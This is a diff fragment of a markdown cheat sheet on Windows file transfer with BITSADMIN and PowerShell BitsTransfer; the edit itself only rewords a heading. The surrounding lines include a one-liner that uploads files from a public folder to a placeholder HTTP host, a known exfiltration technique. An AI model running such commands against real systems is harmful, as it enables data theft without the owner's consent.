@@ -119,7 +119,7 @@ USING BITSADMIN -
     
     powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'c:\users\public\demo1.txt', 'c:\users\public\demo2.txt' -Destination 'http://{LOCAL-IP}/demo1.txt', 'http://{LOCAL-IP}/demo2.txt' -TransferType Upload"
 
-**Upload a single file to a Windows directory to another directory**
+**Transfer single file from one directory to another directory**
     
     powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source '\users\public\demo.txt' -Destination '\users\public\' -TransferType Upload"
 ------------------------------------------------------------------------------------------------------------------
